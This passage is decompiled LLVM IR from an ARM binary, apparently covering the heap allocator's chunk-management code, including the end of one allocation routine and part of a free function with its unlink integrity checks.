  br i1 %v9_12c60, label %dec_label_pc_12c68, label %dec_label_pc_12cb8

dec_label_pc_12c68:                               ; preds = %dec_label_pc_12c5c
  store i32 %v3_12c48, i32* %v2_12c5c, align 4
  %v0_12c6c = load i32, i32* %r2.global-to-local, align 4
  %v1_12c6c = load i32, i32* %ip.global-to-local, align 4
  %v2_12c6c = add i32 %v1_12c6c, 12
  %v3_12c6c = inttoptr i32 %v2_12c6c to i32*
  store i32 %v0_12c6c, i32* %v3_12c6c, align 4
  %v0_12c70 = load i32, i32* %lr.global-to-local, align 4
  %v1_12c70 = load i32, i32* %r5.global-to-local, align 4
  %v2_12c70 = add i32 %v1_12c70, %v0_12c70
  store i32 %v2_12c70, i32* %lr.global-to-local, align 4
  %v0_12c78.pre = load i32, i32* @r0, align 4
  %v0_12c7c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12c74

dec_label_pc_12c74:                               ; preds = %dec_label_pc_12c24, %dec_label_pc_12c68
  %v0_12cec = phi i32 [ %v1_12c28, %dec_label_pc_12c24 ], [ %v2_12c70, %dec_label_pc_12c68 ]
  %v0_12c7c = phi i32 [ %v3_12c38, %dec_label_pc_12c24 ], [ %v0_12c7c.pre, %dec_label_pc_12c68 ]
  %v1_12c90 = phi i32 [ %v2_12c2c, %dec_label_pc_12c24 ], [ %v0_12c78.pre, %dec_label_pc_12c68 ]
  %v0_12c74 = load i32, i32* @r4, align 4
  %v1_12c74 = add i32 %v0_12c74, 44
  %v2_12c74 = inttoptr i32 %v1_12c74 to i32*
  %v3_12c74 = load i32, i32* %v2_12c74, align 4
  store i32 %v3_12c74, i32* %r3.global-to-local, align 4
  %v9_12c78 = icmp eq i32 %v1_12c90, %v3_12c74
  %v1_12c7c = and i32 %v0_12c7c, -4
  store i32 %v1_12c7c, i32* %r5.global-to-local, align 4
  br i1 %v9_12c78, label %dec_label_pc_12cec, label %dec_label_pc_12c84

dec_label_pc_12c84:                               ; preds = %dec_label_pc_12c74
  %v2_12c84 = add i32 %v1_12c90, %v1_12c7c
  store i32 %v2_12c84, i32* %r3.global-to-local, align 4
  %v1_12c88 = add i32 %v2_12c84, 4
  %v2_12c88 = inttoptr i32 %v1_12c88 to i32*
  %v3_12c88 = load i32, i32* %v2_12c88, align 4
  store i32 %v3_12c88, i32* %r3.global-to-local, align 4
  %v1_12c8c = urem i32 %v3_12c88, 2
  %v2_12c8c = icmp eq i32 %v1_12c8c, 0
  %v2_12c90 = add i32 %v1_12c90, 4
  %v3_12c90 = inttoptr i32 %v2_12c90 to i32*
  store i32 %v1_12c7c, i32* %v3_12c90, align 4
  br i1 %v2_12c8c, label %dec_label_pc_12c98, label %dec_label_pc_12c84.dec_label_pc_12cc8_crit_edge

dec_label_pc_12c84.dec_label_pc_12cc8_crit_edge:  ; preds = %dec_label_pc_12c84
  %v0_12ccc.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12cc8

dec_label_pc_12c98:                               ; preds = %dec_label_pc_12c84
  %v0_12c98 = load i32, i32* @r0, align 4
  %v1_12c98 = add i32 %v0_12c98, 8
  %v2_12c98 = inttoptr i32 %v1_12c98 to i32*
  %v3_12c98 = load i32, i32* %v2_12c98, align 4
  store i32 %v3_12c98, i32* %ip.global-to-local, align 4
  %v1_12c9c = add i32 %v3_12c98, 12
  %v2_12c9c = inttoptr i32 %v1_12c9c to i32*
  %v3_12c9c = load i32, i32* %v2_12c9c, align 4
  store i32 %v3_12c9c, i32* %r3.global-to-local, align 4
  %v9_12ca0 = icmp eq i32 %v3_12c9c, %v0_12c98
  %v1_12ca4 = add i32 %v0_12c98, 12
  %v2_12ca4 = inttoptr i32 %v1_12ca4 to i32*
  %v3_12ca4 = load i32, i32* %v2_12ca4, align 4
  store i32 %v3_12ca4, i32* %r2.global-to-local, align 4
  br i1 %v9_12ca0, label %dec_label_pc_12cac, label %dec_label_pc_12cb8

dec_label_pc_12cac:                               ; preds = %dec_label_pc_12c98
  %v1_12cac = add i32 %v3_12ca4, 8
  %v2_12cac = inttoptr i32 %v1_12cac to i32*
  %v3_12cac = load i32, i32* %v2_12cac, align 4
  store i32 %v3_12cac, i32* %r3.global-to-local, align 4
  %v9_12cb0 = icmp eq i32 %v3_12cac, %v0_12c98
  br i1 %v9_12cb0, label %dec_label_pc_12cbc, label %dec_label_pc_12cb8

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12c98, %dec_label_pc_12c5c, %dec_label_pc_12c40, %dec_label_pc_12cac
  %v0_12cb8 = call i32 @abort()
  store i32 %v0_12cb8, i32* @r0, align 4
  %v0_12cbc.pre = load i32, i32* @ip, align 4
  %v1_12cbc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12cbc

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12cac, %dec_label_pc_12cb8
  %v1_12cbc = phi i32 [ %v3_12ca4, %dec_label_pc_12cac ], [ %v1_12cbc.pre, %dec_label_pc_12cb8 ]
  %v0_12cbc = phi i32 [ %v3_12c98, %dec_label_pc_12cac ], [ %v0_12cbc.pre, %dec_label_pc_12cb8 ]
  %v2_12cbc = add i32 %v1_12cbc, 8
  %v3_12cbc = inttoptr i32 %v2_12cbc to i32*
  store i32 %v0_12cbc, i32* %v3_12cbc, align 4
  %v0_12cc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12cc0 = load i32, i32* %ip.global-to-local, align 4
  %v2_12cc0 = add i32 %v1_12cc0, 12
  %v3_12cc0 = inttoptr i32 %v2_12cc0 to i32*
  store i32 %v0_12cc0, i32* %v3_12cc0, align 4
  %v0_12cc4 = load i32, i32* %lr.global-to-local, align 4
  %v1_12cc4 = load i32, i32* %r5.global-to-local, align 4
  %v2_12cc4 = add i32 %v1_12cc4, %v0_12cc4
  store i32 %v2_12cc4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_12cc8

dec_label_pc_12cc8:                               ; preds = %dec_label_pc_12c84.dec_label_pc_12cc8_crit_edge, %dec_label_pc_12cbc
  %v0_12ccc = phi i32 [ %v0_12ccc.pre, %dec_label_pc_12c84.dec_label_pc_12cc8_crit_edge ], [ %v2_12cc4, %dec_label_pc_12cbc ]
  %v0_12cc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12cc8 = add i32 %v0_12cc8, 8
  %v2_12cc8 = inttoptr i32 %v1_12cc8 to i32*
  %v3_12cc8 = load i32, i32* %v2_12cc8, align 4
  store i32 %v3_12cc8, i32* %r2.global-to-local, align 4
  %v1_12ccc = or i32 %v0_12ccc, 1
  store i32 %v1_12ccc, i32* %r3.global-to-local, align 4
  %v0_12cd0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12cd0, i32* %v2_12cc8, align 4
  %v0_12cd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12cd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_12cd4 = add i32 %v1_12cd4, 12
  %v3_12cd4 = inttoptr i32 %v2_12cd4 to i32*
  store i32 %v0_12cd4, i32* %v3_12cd4, align 4
  %v0_12cd8 = load i32, i32* %lr.global-to-local, align 4
  %v1_12cd8 = load i32, i32* %r1.global-to-local, align 4
  %v3_12cd8 = add i32 %v1_12cd8, %v0_12cd8
  %v4_12cd8 = inttoptr i32 %v3_12cd8 to i32*
  store i32 %v0_12cd8, i32* %v4_12cd8, align 4
  %v0_12cdc = load i32, i32* %r3.global-to-local, align 4
  %v1_12cdc = load i32, i32* %r1.global-to-local, align 4
  %v2_12cdc = add i32 %v1_12cdc, 4
  %v3_12cdc = inttoptr i32 %v2_12cdc to i32*
  store i32 %v0_12cdc, i32* %v3_12cdc, align 4
  %v0_12ce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ce0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ce0 = add i32 %v1_12ce0, 8
  %v3_12ce0 = inttoptr i32 %v2_12ce0 to i32*
  store i32 %v0_12ce0, i32* %v3_12ce0, align 4
  %v0_12ce4 = load i32, i32* %r7.global-to-local, align 4
  %v1_12ce4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12ce4 = add i32 %v1_12ce4, 12
  %v3_12ce4 = inttoptr i32 %v2_12ce4 to i32*
  store i32 %v0_12ce4, i32* %v3_12ce4, align 4
  br label %dec_label_pc_12cfc

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12c74
  %v2_12cec = add i32 %v1_12c7c, %v0_12cec
  %v1_12cf0 = or i32 %v2_12cec, 1
  store i32 %v1_12cf0, i32* %r3.global-to-local, align 4
  %v1_12cf4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12cf4 = add i32 %v1_12cf4, 4
  %v3_12cf4 = inttoptr i32 %v2_12cf4 to i32*
  store i32 %v1_12cf0, i32* %v3_12cf4, align 4
  %v0_12cf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12cf8 = load i32, i32* @r4, align 4
  %v2_12cf8 = add i32 %v1_12cf8, 44
  %v3_12cf8 = inttoptr i32 %v2_12cf8 to i32*
  store i32 %v0_12cf8, i32* %v3_12cf8, align 4
  br label %dec_label_pc_12cfc

dec_label_pc_12cfc:                               ; preds = %dec_label_pc_12cc8, %dec_label_pc_12cec
  %v0_12cfc = load i32, i32* %sl.global-to-local, align 4
  %v2_12cfc = icmp eq i32 %v0_12cfc, 0
  store i32 %v0_12cfc, i32* %r1.global-to-local, align 4
  br i1 %v2_12cfc, label %dec_label_pc_12d08.loopexit, label %dec_label_pc_12c24

dec_label_pc_12d08.loopexit:                      ; preds = %dec_label_pc_12cfc
  %v0_12d08.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_12d08.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12d08

dec_label_pc_12d08:                               ; preds = %dec_label_pc_12d08.loopexit, %dec_label_pc_12c14
  %v1_12d08 = phi i32 [ %v1_12d08.pre, %dec_label_pc_12d08.loopexit ], [ %v1_12d0810, %dec_label_pc_12c14 ]
  %v0_12d10 = phi i32 [ %v0_12d08.pre, %dec_label_pc_12d08.loopexit ], [ %v1_12c20, %dec_label_pc_12c14 ]
  %v9_12d08 = icmp eq i32 %v0_12d10, %v1_12d08
  br i1 %v9_12d08, label %dec_label_pc_12d80, label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12d08
  %v1_12d10 = add i32 %v0_12d10, 4
  store i32 %v1_12d10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12c14

dec_label_pc_12d18.dec_label_pc_12d18_crit_edge:  ; preds = %dec_label_pc_12d18.preheader, %dec_label_pc_12d18.dec_label_pc_12d18_crit_edge
  %v0_12d18.pre = load i32, i32* @r4, align 4
  %v1_12d18.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_12d18 = mul i32 %v1_12d18.pre, 8
  %v5_12d18 = add i32 %v4_12d18, %v0_12d18.pre
  %v1_12d1c = add i32 %v1_12d18.pre, 1
  store i32 %v1_12d1c, i32* %r2.global-to-local, align 4
  %v1_12d20 = add i32 %v5_12d18, 44
  store i32 %v1_12d20, i32* %r3.global-to-local, align 4
  %v2_12d28 = add i32 %v5_12d18, 52
  %v3_12d28 = inttoptr i32 %v2_12d28 to i32*
  store i32 %v1_12d20, i32* %v3_12d28, align 4
  %v0_12d2c = load i32, i32* %r3.global-to-local, align 4
  %v2_12d2c = add i32 %v0_12d2c, 12
  %v3_12d2c = inttoptr i32 %v2_12d2c to i32*
  store i32 %v0_12d2c, i32* %v3_12d2c, align 4
  %v7_12d30 = icmp sgt i32 %v1_12d1c, 95
  br i1 %v7_12d30, label %dec_label_pc_12d34, label %dec_label_pc_12d18.dec_label_pc_12d18_crit_edge

dec_label_pc_12d34:                               ; preds = %dec_label_pc_12d18.dec_label_pc_12d18_crit_edge
  %v0_12d34 = load i32, i32* @r4, align 4
  %v1_12d34 = inttoptr i32 %v0_12d34 to i32*
  %v2_12d34 = load i32, i32* %v1_12d34, align 4
  store i32 %v2_12d34, i32* %r2.global-to-local, align 4
  %v1_12d38 = add i32 %v0_12d34, 864
  %v2_12d38 = inttoptr i32 %v1_12d38 to i32*
  %v3_12d38 = load i32, i32* %v2_12d38, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12d40 = urem i32 %v2_12d34, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_12d48 = or i32 %v3_12d38, 1
  store i32 %v1_12d48, i32* %r1.global-to-local, align 4
  %v1_12d4c = or i32 %v1_12d40, 72
  store i32 %v1_12d4c, i32* %r2.global-to-local, align 4
  %v1_12d50 = add i32 %v0_12d34, 52
  store i32 %v1_12d50, i32* %ip.global-to-local, align 4
  %v2_12d54 = add i32 %v0_12d34, 840
  %v3_12d54 = inttoptr i32 %v2_12d54 to i32*
  store i32 0, i32* %v3_12d54, align 4
  %v0_12d58 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d58 = add i32 %v0_12d58, 65536
  store i32 %v1_12d58, i32* %r3.global-to-local, align 4
  %v0_12d5c = load i32, i32* %r0.global-to-local, align 4
  %v1_12d5c = load i32, i32* @r4, align 4
  %v2_12d5c = add i32 %v1_12d5c, 836
  %v3_12d5c = inttoptr i32 %v2_12d5c to i32*
  store i32 %v0_12d5c, i32* %v3_12d5c, align 4
  %v0_12d60 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d60 = load i32, i32* @r4, align 4
  %v2_12d60 = add i32 %v1_12d60, 844
  %v3_12d60 = inttoptr i32 %v2_12d60 to i32*
  store i32 %v0_12d60, i32* %v3_12d60, align 4
  %v1_12d64 = load i32, i32* @r4, align 4
  %v2_12d64 = add i32 %v1_12d64, 852
  %v3_12d64 = inttoptr i32 %v2_12d64 to i32*
  store i32 %v1_12d58, i32* %v3_12d64, align 4
  %v1_12d68 = load i32, i32* @r4, align 4
  %v2_12d68 = add i32 %v1_12d68, 864
  %v3_12d68 = inttoptr i32 %v2_12d68 to i32*
  store i32 %v1_12d48, i32* %v3_12d68, align 4
  %v1_12d6c = load i32, i32* @r4, align 4
  %v2_12d6c = inttoptr i32 %v1_12d6c to i32*
  store i32 %v1_12d4c, i32* %v2_12d6c, align 4
  %v0_12d70 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d70 = load i32, i32* @r4, align 4
  %v2_12d70 = add i32 %v1_12d70, 44
  %v3_12d70 = inttoptr i32 %v2_12d70 to i32*
  store i32 %v0_12d70, i32* %v3_12d70, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_12d78 = call i32 @sysconf(i32 30, i32 %v1_12d48, i32 %v1_12d4c, i32 %v1_12d58)
  store i32 %v4_12d78, i32* @r0, align 4
  %v1_12d7c = load i32, i32* @r4, align 4
  %v2_12d7c = add i32 %v1_12d7c, 860
  %v3_12d7c = inttoptr i32 %v2_12d7c to i32*
  store i32 %v4_12d78, i32* %v3_12d7c, align 4
  br label %dec_label_pc_12d80

dec_label_pc_12d80:                               ; preds = %dec_label_pc_12d08, %dec_label_pc_12d34
  %v2_12d84 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12d84, i32* @r4, align 4
  %v1_12d88 = load i32, i32* @r0, align 4
  ret i32 %v1_12d88

; uselistorder directives
  uselistorder i32 %v0_12d34, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12d2c, { 1, 0 }
  uselistorder i32 %v1_12d10, { 1, 0 }
  uselistorder i32 %v0_12cfc, { 0, 2, 1 }
  uselistorder i32 %v0_12cd8, { 1, 0 }
  uselistorder i32 %v1_12c28, { 1, 0, 2 }
  uselistorder i32 %v0_12c40, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12c00, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 17, 2, 10, 6, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 8, 9, 7 }
  uselistorder label %dec_label_pc_12d80, { 1, 0 }
  uselistorder label %dec_label_pc_12d18.dec_label_pc_12d18_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12cfc, { 1, 0 }
  uselistorder label %dec_label_pc_12cc8, { 1, 0 }
  uselistorder label %dec_label_pc_12cbc, { 1, 0 }
  uselistorder label %dec_label_pc_12cb8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12c74, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_12d8c = load i32, i32* @r4, align 4
  %v6_12d8c = load i32, i32* @r5, align 4
  %v9_12d8c = load i32, i32* @r6, align 4
  %v12_12d8c = load i32, i32* @r7, align 4
  %v18_12d8c = load i32, i32* @lr, align 4
  %v0_12d94 = load i32, i32* @r0, align 4
  store i32 %v0_12d94, i32* @r6, align 4
  %v2_12d94 = icmp eq i32 %v0_12d94, 0
  %v2_12d98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r7, align 4
  br i1 %v2_12d94, label %dec_label_pc_12fa0, label %dec_label_pc_12da4

dec_label_pc_12da4:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_12da8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 108) to i32*), align 4
  store i32 %v4_12da8, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_12da8, i32* %r2.global-to-local, align 4
  %v4_12db4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 68) to i32*), align 4
  store i32 %v4_12db4, i32* %r1.global-to-local, align 4
  store i32 %v2_12d98, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_12dc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 112) to i32*), align 4
  store i32 %v4_12dc0, i32* %ip.global-to-local, align 4
  store i32 77260, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12dc0)
  %v0_12dcc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12dcc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12dd4 = load i32, i32* @r7, align 4
  %v2_12dd4 = add i32 %v0_12dd4, 16
  %v3_12dd4 = inttoptr i32 %v2_12dd4 to i32*
  %v4_12dd4 = load i32, i32* %v3_12dd4, align 4
  store i32 %v4_12dd4, i32* %ip.global-to-local, align 4
  store i32 77280, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12dd4)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12de4 = load i32, i32* @r7, align 4
  %v2_12de4 = add i32 %v0_12de4, 64
  %v3_12de4 = inttoptr i32 %v2_12de4 to i32*
  %v4_12de4 = load i32, i32* %v3_12de4, align 4
  store i32 %v4_12de4, i32* @lr, align 4
  %v0_12de8 = load i32, i32* @r6, align 4
  %v1_12de8 = add i32 %v0_12de8, -4
  %v2_12de8 = inttoptr i32 %v1_12de8 to i32*
  %v3_12de8 = load i32, i32* %v2_12de8, align 4
  store i32 %v3_12de8, i32* %r2.global-to-local, align 4
  %v1_12dec = inttoptr i32 %v4_12de4 to i32*
  %v2_12dec = load i32, i32* %v1_12dec, align 4
  store i32 %v2_12dec, i32* %r3.global-to-local, align 4
  %v1_12df0 = and i32 %v3_12de8, -4
  store i32 %v1_12df0, i32* %ip.global-to-local, align 4
  %v1_12df4 = add i32 %v0_12de8, -8
  store i32 %v1_12df4, i32* @r5, align 4
  store i32 %v1_12df4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12df0, %v2_12dec
  br i1 %tmp, label %dec_label_pc_12e24, label %dec_label_pc_12e04

dec_label_pc_12e04:                               ; preds = %dec_label_pc_12da4
  %v1_12e04 = or i32 %v2_12dec, 3
  store i32 %v1_12e04, i32* %r3.global-to-local, align 4
  store i32 %v1_12e04, i32* %v1_12dec, align 4
  %v3_12e08 = load i32, i32* @lr, align 4
  %v4_12e08 = add i32 %v3_12e08, -8
  store i32 %v4_12e08, i32* %lr.global-to-local, align 4
  %v0_12e0c = load i32, i32* %ip.global-to-local, align 4
  %v3_12e0c = udiv i32 %v0_12e0c, 8
  store i32 %v3_12e0c, i32* %r1.global-to-local, align 4
  %v1_12e10 = add i32 %v3_12e08, -4
  store i32 %v1_12e10, i32* %r2.global-to-local, align 4
  %v4_12e14 = mul nuw i32 %v3_12e0c, 4
  %v5_12e14 = add i32 %v4_12e14, %v1_12e10
  %v6_12e14 = inttoptr i32 %v5_12e14 to i32*
  %v7_12e14 = load i32, i32* %v6_12e14, align 4
  store i32 %v7_12e14, i32* %r3.global-to-local, align 4
  %v1_12e18 = load i32, i32* @r5, align 4
  %v2_12e18 = add i32 %v1_12e18, 8
  %v3_12e18 = inttoptr i32 %v2_12e18 to i32*
  store i32 %v7_12e14, i32* %v3_12e18, align 4
  %v0_12e1c = load i32, i32* @r5, align 4
  %v1_12e1c = load i32, i32* %r2.global-to-local, align 4
  %v2_12e1c = load i32, i32* %r1.global-to-local, align 4
  %v5_12e1c = mul i32 %v2_12e1c, 4
  %v6_12e1c = add i32 %v5_12e1c, %v1_12e1c
  %v7_12e1c = inttoptr i32 %v6_12e1c to i32*
  store i32 %v0_12e1c, i32* %v7_12e1c, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12da4
  %v1_12e24 = and i32 %v3_12de8, 2
  %v2_12e24 = icmp eq i32 %v1_12e24, 0
  br i1 %v2_12e24, label %dec_label_pc_12e2c, label %dec_label_pc_12f60

dec_label_pc_12e2c:                               ; preds = %dec_label_pc_12e24
  %v1_12e2c = or i32 %v2_12dec, 1
  store i32 %v1_12e2c, i32* %r3.global-to-local, align 4
  store i32 %v1_12e2c, i32* %v1_12dec, align 4
  %v0_12e34 = load i32, i32* @r6, align 4
  %v1_12e34 = add i32 %v0_12e34, -4
  %v2_12e34 = inttoptr i32 %v1_12e34 to i32*
  %v3_12e34 = load i32, i32* %v2_12e34, align 4
  store i32 %v3_12e34, i32* %r3.global-to-local, align 4
  %v0_12e38 = load i32, i32* @r5, align 4
  %v1_12e38 = load i32, i32* %ip.global-to-local, align 4
  %v2_12e38 = add i32 %v1_12e38, %v0_12e38
  store i32 %v2_12e38, i32* %lr.global-to-local, align 4
  %v1_12e3c = urem i32 %v3_12e34, 2
  %v2_12e3c = icmp eq i32 %v1_12e3c, 0
  %v1_12e40 = add i32 %v2_12e38, 4
  %v2_12e40 = inttoptr i32 %v1_12e40 to i32*
  %v3_12e40 = load i32, i32* %v2_12e40, align 4
  store i32 %v3_12e40, i32* %r8.global-to-local, align 4
  br i1 %v2_12e3c, label %dec_label_pc_12e48, label %dec_label_pc_12e7c

dec_label_pc_12e48:                               ; preds = %dec_label_pc_12e2c
  %v1_12e48 = add i32 %v0_12e34, -8
  %v2_12e48 = inttoptr i32 %v1_12e48 to i32*
  %v3_12e48 = load i32, i32* %v2_12e48, align 4
  store i32 %v3_12e48, i32* %r1.global-to-local, align 4
  %v2_12e4c = sub i32 %v0_12e38, %v3_12e48
  store i32 %v2_12e4c, i32* %r3.global-to-local, align 4
  %v1_12e50 = add i32 %v2_12e4c, 8
  %v2_12e50 = inttoptr i32 %v1_12e50 to i32*
  %v3_12e50 = load i32, i32* %v2_12e50, align 4
  store i32 %v3_12e50, i32* %r2.global-to-local, align 4
  %v1_12e54 = add i32 %v3_12e50, 12
  %v2_12e54 = inttoptr i32 %v1_12e54 to i32*
  %v3_12e54 = load i32, i32* %v2_12e54, align 4
  store i32 %v3_12e54, i32* %r4.global-to-local, align 4
  %v9_12e58 = icmp eq i32 %v3_12e54, %v2_12e4c
  %v1_12e5c = add i32 %v2_12e4c, 12
  %v2_12e5c = inttoptr i32 %v1_12e5c to i32*
  %v3_12e5c = load i32, i32* %v2_12e5c, align 4
  store i32 %v3_12e5c, i32* %r0.global-to-local, align 4
  br i1 %v9_12e58, label %dec_label_pc_12e64, label %dec_label_pc_12ec8

dec_label_pc_12e64:                               ; preds = %dec_label_pc_12e48
  %v1_12e64 = add i32 %v3_12e5c, 8
  %v2_12e64 = inttoptr i32 %v1_12e64 to i32*
  %v3_12e64 = load i32, i32* %v2_12e64, align 4
  store i32 %v3_12e64, i32* %r3.global-to-local, align 4
  %v9_12e68 = icmp eq i32 %v3_12e64, %v2_12e4c
  br i1 %v9_12e68, label %dec_label_pc_12e70, label %dec_label_pc_12ec8

dec_label_pc_12e70:                               ; preds = %dec_label_pc_12e64
  store i32 %v3_12e50, i32* %v2_12e64, align 4
  %v0_12e74 = load i32, i32* %r0.global-to-local, align 4
  %v1_12e74 = load i32, i32* %r2.global-to-local, align 4
  %v2_12e74 = add i32 %v1_12e74, 12
  %v3_12e74 = inttoptr i32 %v2_12e74 to i32*
  store i32 %v0_12e74, i32* %v3_12e74, align 4
  %v0_12e78 = load i32, i32* %ip.global-to-local, align 4
  %v1_12e78 = load i32, i32* %r1.global-to-local, align 4
  %v2_12e78 = add i32 %v1_12e78, %v0_12e78
  store i32 %v2_12e78, i32* %ip.global-to-local, align 4
  %v0_12e88.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_12e8c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_12e7c

dec_label_pc_12e7c:                               ; preds = %dec_label_pc_12e2c, %dec_label_pc_12e70
  %v0_12f08 = phi i32 [ %v1_12e38, %dec_label_pc_12e2c ], [ %v2_12e78, %dec_label_pc_12e70 ]
  %v0_12e8c = phi i32 [ %v3_12e40, %dec_label_pc_12e2c ], [ %v0_12e8c.pre, %dec_label_pc_12e70 ]
  %v1_12ea0 = phi i32 [ %v2_12e38, %dec_label_pc_12e2c ], [ %v0_12e88.pre, %dec_label_pc_12e70 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_12e80 = load i32, i32* @r7, align 4
  %v2_12e80 = add i32 %v0_12e80, 64
  %v3_12e80 = inttoptr i32 %v2_12e80 to i32*
  %v4_12e80 = load i32, i32* %v3_12e80, align 4
  store i32 %v4_12e80, i32* %r2.global-to-local, align 4
  %v1_12e84 = add i32 %v4_12e80, 44
  %v2_12e84 = inttoptr i32 %v1_12e84 to i32*
  %v3_12e84 = load i32, i32* %v2_12e84, align 4
  store i32 %v3_12e84, i32* %r3.global-to-local, align 4
  %v9_12e88 = icmp eq i32 %v1_12ea0, %v3_12e84
  %v1_12e8c = and i32 %v0_12e8c, -4
  store i32 %v1_12e8c, i32* %r0.global-to-local, align 4
  br i1 %v9_12e88, label %dec_label_pc_12f08, label %dec_label_pc_12e94

dec_label_pc_12e94:                               ; preds = %dec_label_pc_12e7c
  %v2_12e94 = add i32 %v1_12ea0, %v1_12e8c
  store i32 %v2_12e94, i32* %r3.global-to-local, align 4
  %v1_12e98 = add i32 %v2_12e94, 4
  %v2_12e98 = inttoptr i32 %v1_12e98 to i32*
  %v3_12e98 = load i32, i32* %v2_12e98, align 4
  store i32 %v3_12e98, i32* %r3.global-to-local, align 4
  %v1_12e9c = urem i32 %v3_12e98, 2
  %v2_12e9c = icmp eq i32 %v1_12e9c, 0
  %v2_12ea0 = add i32 %v1_12ea0, 4
  %v3_12ea0 = inttoptr i32 %v2_12ea0 to i32*
  store i32 %v1_12e8c, i32* %v3_12ea0, align 4
  br i1 %v2_12e9c, label %dec_label_pc_12ea8, label %dec_label_pc_12e94.dec_label_pc_12ed8_crit_edge

dec_label_pc_12e94.dec_label_pc_12ed8_crit_edge:  ; preds = %dec_label_pc_12e94
  %v0_12ee8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ed8

dec_label_pc_12ea8:                               ; preds = %dec_label_pc_12e94
  %v0_12ea8 = load i32, i32* %lr.global-to-local, align 4
  %v1_12ea8 = add i32 %v0_12ea8, 8
  %v2_12ea8 = inttoptr i32 %v1_12ea8 to i32*
  %v3_12ea8 = load i32, i32* %v2_12ea8, align 4
  store i32 %v3_12ea8, i32* %r1.global-to-local, align 4
  %v1_12eac = add i32 %v3_12ea8, 12
  %v2_12eac = inttoptr i32 %v1_12eac to i32*
  %v3_12eac = load i32, i32* %v2_12eac, align 4
  store i32 %v3_12eac, i32* %r3.global-to-local, align 4
  %v9_12eb0 = icmp eq i32 %v3_12eac, %v0_12ea8
  %v1_12eb4 = add i32 %v0_12ea8, 12
  %v2_12eb4 = inttoptr i32 %v1_12eb4 to i32*
  %v3_12eb4 = load i32, i32* %v2_12eb4, align 4
  store i32 %v3_12eb4, i32* %r2.global-to-local, align 4
  br i1 %v9_12eb0, label %dec_label_pc_12ebc, label %dec_label_pc_12ec8

dec_label_pc_12ebc:                               ; preds = %dec_label_pc_12ea8
  %v1_12ebc = add i32 %v3_12eb4, 8
  %v2_12ebc = inttoptr i32 %v1_12ebc to i32*
  %v3_12ebc = load i32, i32* %v2_12ebc, align 4
